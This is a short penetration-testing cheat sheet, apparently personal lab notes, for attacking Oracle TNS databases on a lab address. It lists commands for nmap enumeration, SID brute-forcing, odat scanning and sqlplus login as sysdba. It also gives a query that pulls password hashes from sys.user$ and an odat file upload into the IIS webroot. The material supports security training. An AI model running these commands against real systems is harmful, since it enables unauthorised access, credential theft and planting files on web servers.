For attacking [SQL Databases](obsidian://open?vault=Obsidian%20Vault&file=Exploit%2FATTACKING%20COMMON%20SERVICES%2FAttacking%20SQL%20Databases)
```bash
# nmap enumartion
nmap -p1521 -sV 10.129.204.235 --open

# nmap - SID Bruteforcing
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# enumarte oracel database with this tool
odat all -s 10.129.204.235

# sqlPlus - login 
sqlplus username/password@10.129.204.235/XE;
# if we get an error 
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

# try to login as admin
sqlplus username/password@10.129.204.235/XE as sysdba


quries
# get tables
select table_name from all_tables;

# get user privligas
select * from user_role_privs;

# Extract Password Hashes
select name, password from sys.user$;


# File Upload
echo "Oracle File Upload Test" > testing.txt
odat utlfile -s 10.129.204.235 -d XE -U username -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
# try to run the file
curl -X GET http://10.129.204.235/testing.txt
```